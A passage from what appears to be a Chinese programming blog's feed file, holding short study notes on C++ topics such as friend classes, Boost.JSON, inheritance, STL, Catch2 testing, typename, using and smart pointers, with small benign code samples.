<p>C++ 设计者认为， 如果有的程序员真的非常怕麻烦，就是想在类的成员函数外部直接访问对象的私有成员，那还是做一点妥协以满足他们的愿望为好，这也算是眼前利益和长远利益的折中。因此，C++ 就有了友元（friend）的概念。打个比方，这相当于是说：朋友是值得信任的，所以可以对他们公开一些自己的隐私。</p>
<p>友元分为两种：友元函数和友元类。</p>
<h1 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h1><p>在定义一个类的时候，可以把一些函数（包括全局函数和其他类的成员函数）声明为“友元”，这样那些函数就成为该类的友元函数，在友元函数内部就可以访问该类对象的私有成员了。</p>
<h1 id="友元类"><a href="#友元类" class="headerlink" title="友元类"></a>友元类</h1><p>一个类 A 可以将另一个类 B 声明为自己的友元，类 B 的所有成员函数就都可以访问类 A 对象的私有成员。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://c.biancheng.net/view/169.html" target="_blank" rel="noopener">C++友元函数和友元类（C++ friend）详解</a>,by c语言中文网.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus之Boost的JSON库操作</title>
    <url>/2021/11/08/CPlusPlus%E4%B9%8BBoost%E7%9A%84JSON%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>12月11日，Boost社区发布了1.75版本，带来了JSON，LEAF，PFR三个新库。其中JSON自然是json格式的解析库，来自Vinnie Falco和Krystian Stasiowski。</p>
<h1 id="JSON库简介"><a href="#JSON库简介" class="headerlink" title="JSON库简介"></a>JSON库简介</h1><p>其实在之前，Boost就已经有能够解析JSON的库了，名字叫做Boost.PropertyTree。Boost.PropertyTree不仅仅能够解析JSON，还能解析XML，INI和INFO格式的文件。但是由于成文较早及需要兼容其他的数据格式，相比较于其他的C++解析库，其显得比较笨重，使用的时候有很多的不方便。且存在以下问题：</p>
<ul>
<li>不支持 JSON 中的空数组</li>
<li>所有类型信息都丢失了(所有内容都必须是 JSON 字符串)</li>
</ul>
<p>Boost.JSON相对于Boost.PropertyTree来所，其只能支持JSON格式的解析，但是其使用方法更为简便，直接。华丽胡哨的东西也更多了。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/ink19/p/Boost_JSON.html" target="_blank" rel="noopener">Boost.JSON Boost的JSON解析库（1.75首发）</a>,by ink19.</li>
<li><a href="https://www.coder.work/article/831796" target="_blank" rel="noopener">c++ - 如何使用 json 解析器的 boost property_tree 创建空数组节点</a>,by coder.</li>
<li><a href="https://codeleading.com/article/26965136272/" target="_blank" rel="noopener">【C++/Boost】 新增的JSON Library简介</a>,by codeleading.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++多继承的优缺点</title>
    <url>/2019/10/05/CPlusPlus%E5%A4%9A%E7%BB%A7%E6%89%BF%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</url>
    <content><![CDATA[<p>C++中子类可继承多个父类。多继承对父类的个数没有限制，继承方式可以是公共继承、保护继承和私有继承，不写继承方式，默认是private继承。C++多继承语法非常灵活，使用得当可极大提高编程效率，但同时不能其潜在的缺点：</p>
<ul>
<li>如果一个类继承多个父类，如果父类中的方法名如果相同，那么就会产生歧义。</li>
<li>如果父类中的方法同名，子类中没有覆盖，同样会产生上面的错误。</li>
</ul>
<p>针对上述缺点，C#和Java中都不支持类多继承，而是使用类单继承和接口多继承设计替代类多继承。</p>
<h1 id="继承类型"><a href="#继承类型" class="headerlink" title="继承类型"></a>继承类型</h1><p>当一个类派生自基类，该基类可以被继承为 public、protected 或 private 几种类型。继承类型是通过上面讲解的访问修饰符 access-specifier 来指定的。</p>
<p>我们几乎不使用 protected 或 private 继承，通常使用 public 继承。当使用不同类型的继承时，遵循以下几个规则：</p>
<ul>
<li>公有继承（public）：当一个类派生自公有基类时，基类的公有成员也是派生类的公有成员，基类的保护成员也是派生类的保护成员，基类的私有成员不能直接被派生类访问，但是可以通过调用基类的公有和保护成员来访问。</li>
<li>保护继承（protected）： 当一个类派生自保护基类时，基类的公有和保护成员将成为派生类的保护成员。</li>
<li>私有继承（private）：当一个类派生自私有基类时，基类的公有和保护成员将成为派生类的私有成员。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/leotsai/p/csharp-multi-inheritance.html" target="_blank" rel="noopener">论C#之多继承</a>,by Leo.</li>
<li><a href="https://www.zhihu.com/question/20149818" target="_blank" rel="noopener">接口和抽象类有什么区别？</a>,by zhihu.</li>
<li><a href="https://blog.csdn.net/fengzijinliang/article/details/51439368" target="_blank" rel="noopener">java类单继承，接口多继承设计的原因</a>,by xiaoxiang-chen.</li>
<li><a href="https://blog.csdn.net/hudfang/article/details/50556277" target="_blank" rel="noopener">C++学习之继承篇（多继承与多重继承）</a>,by hudfang.</li>
<li><a href="https://zhuanlan.zhihu.com/p/348311978" target="_blank" rel="noopener">C++ 继承访问权限控制(public,protected,private)</a>,by c++入门与提高.</li>
<li><a href="https://blog.csdn.net/hudie66fei/article/details/122196602" target="_blank" rel="noopener">c++ 类受保护成员的访问</a>,by hudie66fei.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++标准模板库STL入门</title>
    <url>/2019/11/10/CPlusPlus%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>最近C++编程中需要管理多个由同一个类实例化的对象，于是想到了C++的标准模板库STL，在此将STL的相关知识记录一下。</p>
<h1 id="STL的来龙去脉"><a href="#STL的来龙去脉" class="headerlink" title="STL的来龙去脉"></a>STL的来龙去脉</h1><p>STL 历史可以追溯到 1972 年 C 语言在 UNIX 计算机上的首次使用。直到 1994 年，STL 才被正式纳入 C++ 标准中。</p>
<p>标准模板库（STL）是 C ++编程语言的软件库，影响了C ++标准库的许多部分。它提供了四个组件，分别称为<strong>算法，容器，仿函数和迭代器</strong>。</p>
<p>STL为 C ++提供了一组通用类，例如容器和关联数组，可以与任何内置类型和支持某些基本操作（例如复制和赋值）的任何用户定义类型一起使用。 STL算法独立于容器，从而大大降低了库的复杂性。</p>
<p>STL通过使用模板来实现其结果。这种方法提供的编译时多态性通常比传统的运行时多态性更有效。对现代 C ++编译器进行了调整，以最大程度地减少由于大量使用STL而引起的抽象损失。</p>
<p>STL是创建的第一个C ++通用算法和数据结构库，它牢记四个想法：通用编程，不损失效率的抽象性，冯·诺依曼计算模型和值语义。</p>
<h1 id="STL-组件"><a href="#STL-组件" class="headerlink" title="STL 组件"></a>STL 组件</h1><p>STL 将“在数据上执行的操作”与“要执行操作的数据分开”，分别以如下概念指代：</p>
<ul>
<li>容器：包含、放置数据的地方。</li>
<li>迭代器：在容器中指出一个位置、或成对使用以划定一个区域，用来限定操作所涉及到的数据范围。</li>
<li>算法：要执行的操作。</li>
</ul>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>容器即用来存储并管理某类对象的集合。例如鱼缸是用来盛放金鱼的容器。标准模板库中容器主要分为序列容器（sequence containers）与关系容器（associative containers）。</p>
<p>序列容器包括：</p>
<ul>
<li>vector</li>
<li>list</li>
<li>forward_list</li>
<li>deque</li>
<li>array</li>
</ul>
<p>关联容器包括：</p>
<ul>
<li>set</li>
<li>multiset</li>
<li>map</li>
<li>multimap</li>
<li>unordered_set</li>
<li>unordered_multiset</li>
<li>unordered_map</li>
<li>unordered_multimap</li>
</ul>
<p>其他类型的容器包括：</p>
<ul>
<li>bitset</li>
<li>valarray</li>
</ul>
<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>迭代器用于在一个对象群集的元素上进行遍历动作。对象群集可能是容器，也可能是容器的一部分。</p>
<p>迭代器的主要用途是为容器提供一组很小的公共接口。利用这个接口，某项操作可以行进至群集内的下一个元素。</p>
<p>每种容器都提供了各自的迭代器。迭代器了解该容器的内部结构，所以能够正确行进。迭代器的接口和一般指针类似。</p>
<p>迭代器的作用就是提供一个遍历容器内部所有元素的接口，因此迭代器的内部必须保存一个与容器相关联的指针，然后重载各种运算操作来方便遍历，其中最重要的就是∗运算符和-&gt;运算符，以及++，–等可能需要的运算符重载。</p>
<p>根据迭代器的操作方式的不同，迭代器分为五种：</p>
<ul>
<li>输入迭代器</li>
<li>输出迭代器</li>
<li>前向迭代器</li>
<li>双向迭代器</li>
<li>随机访问迭代器</li>
</ul>
<p>迭代器的示例代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; v;        &#x2F;&#x2F; 定义一个vector容器</span><br><span class="line"></span><br><span class="line">    v.push_back(1);        &#x2F;&#x2F; 向容器中添加3个元素</span><br><span class="line">    v.push_back(2);</span><br><span class="line">    v.push_back(3);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 遍历向量的元素</span><br><span class="line">    vector&lt;int&gt;::iterator b &#x3D; v.begin();        &#x2F;&#x2F; 指向容器的第一个元素</span><br><span class="line">    vector&lt;int&gt;::iterator e &#x3D; v.end();            &#x2F;&#x2F; 指向容器尾元素的下一个位置</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; C++11新标准的写法, auto关键字为类型推断，由编译器自动完成</span><br><span class="line">    &#x2F;&#x2F; auto b &#x3D; v.begin();</span><br><span class="line">    &#x2F;&#x2F; auto e &#x3D; v.end();</span><br><span class="line"></span><br><span class="line">    for (vector&lt;int&gt;::iterator iter &#x3D; b; iter !&#x3D; e; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>算法用来处理群集内的元素，可以出于不同目的搜寻、排序、修改、使用那些元素。所有容器的迭代器都提供一致的接口，通过迭代器的协助，算法程序可以用于任意容器。</p>
<p>STL 的一个特性是将数据和操作分离。数据由容器类别加以管理，操作则由可定制的算法定义。迭代器在两者之间充当“粘合剂”，以使算法可以和容器交互运作。</p>
<p>STL 的另一个特性即组件可以针对任意型别运作。“标准模板库”这一名称即表示“可接受任意型别”的模板，并且这些型别均可执行必要操作。</p>
<h2 id="仿函数"><a href="#仿函数" class="headerlink" title="仿函数"></a>仿函数</h2><p>STL中大量运用了仿函数。仿函数具有泛型编程强大的威力，是纯粹抽象概念的例证。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://c.biancheng.net/stl/" target="_blank" rel="noopener">STL教程：C++ STL快速入门</a>,by C语言中文网.</li>
<li><a href="http://c.biancheng.net/view/1436.html" target="_blank" rel="noopener">STL是什么（STL简介）</a>,by C语言中文网.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93" target="_blank" rel="noopener">标准模板库</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/77d0dd2fa3ee" target="_blank" rel="noopener">C++ STL初识及整理</a>,by thinkChao.</li>
<li><a href="https://blog.csdn.net/wutao1530663/article/details/64922389" target="_blank" rel="noopener">C++标准模板库(STL)迭代器的原理与实现</a>,by wutao02.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus单元测试框架Catch入门</title>
    <url>/2020/01/15/CPlusPlus%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Catch%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>最近在编写一个飞行力学的类库，随着类数量的增加，代码越来越复杂，质量越来越难以控制，因此引入单元测试，通过自动化测试以保障代码质量，防止因代码修改引入新的Bug。C++已经有一些成熟的代码测试框架，例如：Google Test, Boost.Test, CppUnit, Cute，等等。通过综合分析和比较，最终选择Catch2测试框架。选择该测试框架的原因是其够轻量级，够简单。</p>
<h1 id="Catch2简介"><a href="#Catch2简介" class="headerlink" title="Catch2简介"></a>Catch2简介</h1><p>Catch2是轻量级的C++的多范式测试框架。 它也支持Objective-C（也许还有C）。 它主要作为单个头文件分发，尽管某些扩展可能需要其他头文件。</p>
<h2 id="关键特征"><a href="#关键特征" class="headerlink" title="关键特征"></a>关键特征</h2><ul>
<li>快速且非常容易上手。 只需下载catch.hpp，＃include它就可以了。</li>
<li>没有外部依赖性。 只要您可以编译C ++ 11并拥有C ++标准库即可。</li>
<li>将测试用例编写为自注册函数（或方法，如果您愿意的话）。</li>
<li>将测试用例划分为几个部分，每个部分都是独立运行的（消除了对夹具的需求）。</li>
<li>使用BDD样式的“时准时限”部分以及传统的单元测试用例。</li>
<li>仅一个核心声明宏可以进行比较。 使用标准C / C ++运算符进行比较-但是完整的表达式已分解，并且记录了lhs和rhs值。</li>
<li>测试使用自由格式的字符串命名-合法标识符中没有其他名称。</li>
</ul>
<h2 id="核心特征"><a href="#核心特征" class="headerlink" title="核心特征"></a>核心特征</h2><ul>
<li>可以对测试进行标记，以方便地运行临时的测试组。</li>
<li>故障可能（可选）进入Windows和Mac上的调试器。</li>
<li>输出通过模块化报告器对象。 包括基本的文本和XML报告程序。 自定义记者可以轻松添加。</li>
<li>支持JUnit xml输出以与第三方工具（例如CI服务器）集成。</li>
<li>提供了默认的main（）函数，但您可以提供自己的控件来进行完全控制（例如，集成到自己的测试运行器GUI中）。</li>
<li>提供了命令行解析器，如果您选择提供自己的main（）函数，该解析器仍可以使用。</li>
<li>Catch可以测试自己。</li>
<li>替代性断言宏报告失败，但不中止测试用例</li>
<li>浮点公差比较是使用表达性的Approx（）语法构建的。</li>
<li>内部和友好的宏是隔离的，因此可以管理名称冲突</li>
<li>匹配器</li>
</ul>
<h1 id="Catch示例"><a href="#Catch示例" class="headerlink" title="Catch示例"></a>Catch示例</h1><p>使用Catch进行单元测试，只需简单掌握TEST_CASE、REQUIRE、SECTION三个宏即可编写绝大部分的测试用例。简单示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TEST_CASE( &quot;vectors can be sized and resized&quot;, &quot;[vector]&quot; ) &#123;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;int&gt; v( 5 );</span><br><span class="line"></span><br><span class="line">    REQUIRE( v.size() &#x3D;&#x3D; 5 );</span><br><span class="line">    REQUIRE( v.capacity() &gt;&#x3D; 5 );</span><br><span class="line"></span><br><span class="line">    SECTION( &quot;resizing bigger changes size and capacity&quot; ) &#123;</span><br><span class="line">        v.resize( 10 );</span><br><span class="line"></span><br><span class="line">        REQUIRE( v.size() &#x3D;&#x3D; 10 );</span><br><span class="line">        REQUIRE( v.capacity() &gt;&#x3D; 10 );</span><br><span class="line">    &#125;</span><br><span class="line">    SECTION( &quot;resizing smaller changes size but not capacity&quot; ) &#123;</span><br><span class="line">        v.resize( 0 );</span><br><span class="line"></span><br><span class="line">        REQUIRE( v.size() &#x3D;&#x3D; 0 );</span><br><span class="line">        REQUIRE( v.capacity() &gt;&#x3D; 5 );</span><br><span class="line">    &#125;</span><br><span class="line">    SECTION( &quot;reserving bigger changes capacity but not size&quot; ) &#123;</span><br><span class="line">        v.reserve( 10 );</span><br><span class="line"></span><br><span class="line">        REQUIRE( v.size() &#x3D;&#x3D; 5 );</span><br><span class="line">        REQUIRE( v.capacity() &gt;&#x3D; 10 );</span><br><span class="line">    &#125;</span><br><span class="line">    SECTION( &quot;reserving smaller does not change size or capacity&quot; ) &#123;</span><br><span class="line">        v.reserve( 0 );</span><br><span class="line"></span><br><span class="line">        REQUIRE( v.size() &#x3D;&#x3D; 5 );</span><br><span class="line">        REQUIRE( v.capacity() &gt;&#x3D; 5 );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述示例中，对于每个SECTION，TEST_CASE都是从头开始执行的，因此，当我们进入每个部分时，我们知道vector的大小为5，容量至少为5。通过REQUIRE宏在顶层确保vector大小和容量的正确性。这是可行的，因为SECTION宏包含一个if语句，该语句回调Catch来查看是否应执行该节。 通过TEST_CASE，每次运行都会执行一个叶子部分。 其他部分将被跳过。 下次执行下一个部分，依此类推，直到没有新的部分为止。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://filebox.ece.vt.edu/~ECE2574/testing.html" target="_blank" rel="noopener">Writing Unit Tests with Catch and CMake</a>,by filebox.</li>
<li><a href="https://schneide.blog/2017/12/11/integrating-catch2-with-cmake-and-jenkins/" target="_blank" rel="noopener">Integrating catch2 with CMake and Jenkins</a>,by mariuselvert.</li>
<li><a href="https://github.com/catchorg/Catch2" target="_blank" rel="noopener">Catch2</a>,by catchorg.</li>
<li><a href="https://segmentfault.com/q/1010000002412786" target="_blank" rel="noopener">C++单元测试入门</a>,by pezy.</li>
<li><a href="https://www.cnblogs.com/Bluemultipl/p/16002295.html" target="_blank" rel="noopener">Catch2 - 用于 test 的轻量级库</a>,by Bluemultipl.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus的typename关键字</title>
    <url>/2021/12/21/CPlusPlus%E7%9A%84typename%E5%85%B3%E9%94%AE%E5%AD%97/</url>
    <content><![CDATA[<p>“typename”是一个C++程序设计语言中的关键字。当用于泛型编程时是另一术语”class”的同义词。typename关键字主要功能有两项：</p>
<ul>
<li>class关键字的同义词</li>
</ul>
<p>这是一项C++编程语言的泛型编程（或曰“模板编程”）的功能，typename关键字用于引入一个模板参数。</p>
<ul>
<li>类型名指示符</li>
</ul>
<p>显式地告诉编译器，T::bar是一个类型名。这就必须用typename关键字，而非模板类的静态变量。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/Typename" target="_blank" rel="noopener">typename</a>,by wikipedia.</li>
<li><a href="https://feihu.me/blog/2014/the-origin-and-usage-of-typename/" target="_blank" rel="noopener">知无涯之C++ typename的起源与用法</a>,by libfeihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus的using关键字用法</title>
    <url>/2021/12/21/CPlusPlus%E7%9A%84using%E5%85%B3%E9%94%AE%E5%AD%97%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>C++ using关键字主要有三种用法：</p>
<ul>
<li>导入命名空间</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 导入整个命名空间到当前作用域</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 只导入某个变量到当前作用域 </span><br><span class="line">using std::cout;</span><br></pre></td></tr></table></figure>

<ul>
<li>指定别名</li>
</ul>
<p>C++ 11 通过 using 指定别名，作用等同于 typedef，但相比 typedef，逻辑更直观，可读性更好。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef int T; &#x2F;&#x2F; 用 T 代替 int</span><br><span class="line">using T &#x3D; int; &#x2F;&#x2F; 用 T 代替 int</span><br></pre></td></tr></table></figure>

<ul>
<li>在派生类中引用基类成员</li>
</ul>
<p>using关键字可以让父类同名函数在子类中以重载方式使用。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/yangxuan0261/article/details/50096497" target="_blank" rel="noopener">c++11中的using关键字</a>,by 蝶泳奈何桥.</li>
<li><a href="http://blog.sina.com.cn/s/blog_86186c970102yqpo.html" target="_blank" rel="noopener">C++中using的三种用法 </a>,by 算法集市.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++矩阵的存储方法接出存储方法-行主序与列主序</title>
    <url>/2019/12/11/CPlusPlus%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95%E6%8E%A5%E5%87%BA%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95-%E8%A1%8C%E4%B8%BB%E5%BA%8F%E4%B8%8E%E5%88%97%E4%B8%BB%E5%BA%8F/</url>
    <content><![CDATA[<p>最近要设计一个C++矩阵类，涉及到矩阵元素的存储。根据矩阵元素的存储，通常分为行主序和列主序。</p>
<ul>
<li><p>行主序是指以行为优先单位，在内存中逐行存储；</p>
</li>
<li><p>列主序是指以列为优先单位，在内存中逐列存储。</p>
</li>
</ul>
<p>行主序与列主序的代码实现有一定的惯例，表现如下：</p>
<ul>
<li>行主序以二维数组存储，列主序以一维数组存储；</li>
<li>行主序以二维数组方式命名初始化参数，列主序以一维数组方式命名初始化参数；</li>
<li>行主序以行为单位初始化，列主序以列为单位初始化；</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/bfc8327eaad3" target="_blank" rel="noopener">OpenGL中矩阵的行主序与列主序</a>,by 天律界中子.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus迭代器</title>
    <url>/2021/12/22/CPlusPlus%E8%BF%AD%E4%BB%A3%E5%99%A8/</url>
    <content><![CDATA[<blockquote>
<p>iterator是不是pointer呢?要看container而定，由上可知，vector的iterator是pointer，list的iterator就不是pointer，而是object利用operator overloading使它表面上的操作像pointer而已，但並不是一個pointer。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/oomusou/archive/2008/07/21/stl_iterator_pointer.html" target="_blank" rel="noopener">iterator到底是不是pointer? (C/C++) (STL)</a>,by 真 OO无双.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus智能指针简介</title>
    <url>/2021/11/13/CPlusPlus%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>当类中有指针成员时，一般有两种方式来管理指针成员：一是采用值型的方式管理，每个类对象都保留一份指针指向的对象的拷贝；另一种更优雅的方式是使用智能指针，从而实现指针指向的对象的共享。</p>
<p>智能指针(smart pointer)的一种通用实现技术是使用引用计数(reference count)。智能指针类将一个计数器与类指向的对象相关联，引用计数跟踪该类有多少个对象的指针指向同一对象。</p>
<h1 id="auto-ptr"><a href="#auto-ptr" class="headerlink" title="auto_ptr"></a>auto_ptr</h1><p>auto_ptr的实现原理其实是在构造的时候获取资源，在析构的时候释放资源，并进行相关指针操作的重载，使用起来就像普通的指针。</p>
<h1 id="smart-ptr"><a href="#smart-ptr" class="headerlink" title="smart_ptr"></a>smart_ptr</h1><p>智能指针（smart_ptr）是Boost各组件中，应用最为广泛的一个。</p>
<p>Boost从很早就提供了如下的智能指针，并且功能一直保持稳定：</p>
<ul>
<li>scoped_ptr：不可拷贝与赋值，承载new，只能在 scoped_ptr 声明的作用域内使用。</li>
<li>scoped_array：不可拷贝与赋值，承载new []。</li>
<li>shared_ptr：可拷贝，承载new。boost 库中重要组成，重点学习。</li>
<li>shared_array：可拷贝，承载new []。</li>
<li>weak_ptr：弱引用。</li>
<li>intrusive_ptr：需要自实现计数功能的，引用计数智能指针。</li>
</ul>
<h2 id="smart-ptr的一种实现"><a href="#smart-ptr的一种实现" class="headerlink" title="smart_ptr的一种实现"></a>smart_ptr的一种实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">template &lt;typename T&gt;  </span><br><span class="line">class smart_ptr  </span><br><span class="line">&#123;  </span><br><span class="line">public:  </span><br><span class="line">    smart_ptr(T *p &#x3D; 0): pointee(p), count(new size_t(1)) &#123; &#125;  &#x2F;&#x2F;初始的计数值为1  </span><br><span class="line">    smart_ptr(const smart_ptr &amp;rhs): pointee(rhs.pointee), count(rhs.count) &#123; ++*count; &#125; &#x2F;&#x2F;拷贝构造函数，计数加1  </span><br><span class="line">    ~smart_ptr() &#123; decr_count(); &#125;              &#x2F;&#x2F;析构，计数减1，减到0时进行垃圾回收，即释放空间  </span><br><span class="line">    smart_ptr&amp; operator&#x3D; (const smart_ptr&amp; rhs) &#x2F;&#x2F;重载赋值操作符  </span><br><span class="line">    &#123;  </span><br><span class="line">        &#x2F;&#x2F;给自身赋值也对，因为如果自身赋值，计数器先减1，再加1，并未发生改变  </span><br><span class="line">        ++*count;  </span><br><span class="line">        decr_count();  </span><br><span class="line">        pointee &#x3D; rhs.pointee;  </span><br><span class="line">        count &#x3D; rhs.count;  </span><br><span class="line">        return *this;  </span><br><span class="line">    &#125;    </span><br><span class="line">    &#x2F;&#x2F;重载箭头操作符和解引用操作符，未提供指针的检查  </span><br><span class="line">    T *operator-&gt;() &#123; return pointee; &#125;  </span><br><span class="line">    const T *operator-&gt;() const &#123; return pointee; &#125;  </span><br><span class="line">    T &amp;operator*() &#123; return *pointee; &#125;  </span><br><span class="line">    const T &amp;operator*() const &#123; return *pointee; &#125;  </span><br><span class="line">    size_t get_refcount() &#123; return *count; &#125; &#x2F;&#x2F;获得引用计数器值  </span><br><span class="line">private:   </span><br><span class="line">    T *pointee;       &#x2F;&#x2F;实际指针，被代理    </span><br><span class="line">    size_t *count;    &#x2F;&#x2F;引用计数器  </span><br><span class="line">    void decr_count() &#x2F;&#x2F;计数器减1  </span><br><span class="line">    &#123;  </span><br><span class="line">        if(--*count &#x3D;&#x3D; 0)   </span><br><span class="line">        &#123;  </span><br><span class="line">            delete pointee;  </span><br><span class="line">            delete count;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="c-11智能指针"><a href="#c-11智能指针" class="headerlink" title="c++ 11智能指针"></a>c++ 11智能指针</h1><p>c++ 11 提供了3种智能指针：std::shared_ptr、std::unique_ptr、std::weak_ptr，使用时引用头文件 <memory>。</p>
<ul>
<li>shared_ptr允许多个指针指向同一个对象</li>
<li>unique_ptr则“独占”所指向的对象</li>
<li>weak_ptr，它是一种弱引用，指向shared_ptr所管理的对象</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/10784135" target="_blank" rel="noopener">智能指针</a>,by 百度百科。</li>
<li><a href="https://zhuanlan.zhihu.com/p/431714886" target="_blank" rel="noopener">C++各类设计模式及实现详解</a>,by linux.</li>
<li><a href="https://blog.csdn.net/gatieme/article/details/50939155" target="_blank" rel="noopener">C++智能指针auto_ptr详解</a>,by CHENG Jian.</li>
<li><a href="https://blog.einverne.info/post/2015/12/boost-learning-note-4.html" target="_blank" rel="noopener">boost 学习笔记 4：智能指针 smart_ptr</a>,by einverne.</li>
<li><a href="https://blog.csdn.net/paokuflying/article/details/107204760" target="_blank" rel="noopener">研究C++类的成员变量构造析构顺序</a>,by paokuflying.</li>
<li><a href="https://blog.csdn.net/caesar1228/article/details/102640712" target="_blank" rel="noopener">C++智能指针作为成员变量</a>,by caesar1228.</li>
<li><a href="https://zhuanlan.zhihu.com/p/79883965" target="_blank" rel="noopener">为什么建议你用nullptr而不是NULL</a>,by 守望.</li>
<li><a href="https://blog.csdn.net/kenjianqi1647/article/details/110470543" target="_blank" rel="noopener">C++11动态内存与智能指针</a>,by herryone123.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus运算符重载</title>
    <url>/2021/12/22/CPlusPlus%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/</url>
    <content><![CDATA[<p>C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为函数重载和运算符重载。</p>
<p>重载声明是指一个与之前已经在该作用域内声明过的函数或方法具有相同名称的声明，但是它们的参数列表和定义（实现）不相同。</p>
<p>当您调用一个重载函数或重载运算符时，编译器通过把您所使用的参数类型与定义中的参数类型进行比较，决定选用最合适的定义。选择最合适的重载函数或重载运算符的过程，称为重载决策。</p>
<h1 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h1><p>您可以重定义或重载大部分 C++ 内置的运算符。这样，您就能使用自定义类型的运算符。</p>
<p>重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。</p>
<h2 id="gt-重载"><a href="#gt-重载" class="headerlink" title="-&gt;重载"></a>-&gt;重载</h2><p>C++98 standard §13.5.6/1 “Class member access”:</p>
<blockquote>
